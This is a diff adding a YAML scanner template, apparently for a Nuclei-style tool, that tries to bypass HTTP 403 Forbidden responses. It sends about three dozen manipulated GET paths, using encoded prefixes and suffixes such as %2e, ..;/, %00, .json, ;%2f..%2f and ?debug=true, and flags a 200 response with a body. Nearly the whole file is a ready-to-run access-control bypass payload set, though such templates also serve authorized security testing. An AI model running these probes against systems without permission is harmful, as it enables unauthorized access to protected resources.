@@ -1,0 +1,72 @@
+id: 403-bypass-path
+name: 403 Forbidden Bypass - Path Manipulation
+version: 1.0
+author: GochaOqradze
+severity: high
+description: >
+  Attempts to bypass 403 Forbidden responses by manipulating the URL path
+  with various encoding tricks, path normalization bypasses, and suffix
+  appending techniques. Tests prefixes (%2e, ./, //, ..;/) and suffixes
+  (?, %00, .json, /dummy/..;/) that may confuse access control mechanisms.
+
+tags:
+  - bypass
+  - 403-bypass
+  - access-control
+  - authorization
+
+requests:
+  - method: GET
+    path:
+      # Prefix-based bypasses
+      - "/%2e{{BaseURL}}"
+      - "/./{{BaseURL}}"
+      - "//{{BaseURL}}"
+      - "/{{BaseURL}}/"
+      - "/{{BaseURL}}/."
+      - "/{{BaseURL}}/.//"
+      - "/..;/{{BaseURL}}"
+      - "/.;/{{BaseURL}}"
+      - "/%20{{BaseURL}}"
+      - "/%00{{BaseURL}}"
+      - "/%09{{BaseURL}}"
+      - "/%23{{BaseURL}}"
+      - "/{{BaseURL}}%20"
+      - "/{{BaseURL}}%09"
+      - "/{{BaseURL}}%00"
+      - "/{{BaseURL}}%0a"
+      - "/{{BaseURL}}%0d"
+      - "/{{BaseURL}}?"
+      - "/{{BaseURL}}??"
+      - "/{{BaseURL}}???"
+      - "/{{BaseURL}}.json"
+      - "/{{BaseURL}}.html"
+      - "/{{BaseURL}}.php"
+      - "/{{BaseURL}}.css"
+      - "/{{BaseURL}}/.dummy"
+      - "/{{BaseURL}}/dummy/..;/"
+      - "/{{BaseURL}}..;/"
+      - "/{{BaseURL}}%23"
+      - "/{{BaseURL}}%26"
+      - "/{{BaseURL}}%3f"
+      - "/{{BaseURL}}/*"
+      - "/..%3B/{{BaseURL}}"
+      - "/;%2f..%2f..%2f{{BaseURL}}"
+      - "/{{BaseURL}}?debug=1"
+      - "/{{BaseURL}}?debug=true"
+      - "/{{BaseURL}}?WSDL"
+
+    redirects: false
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "len(body) > 0"
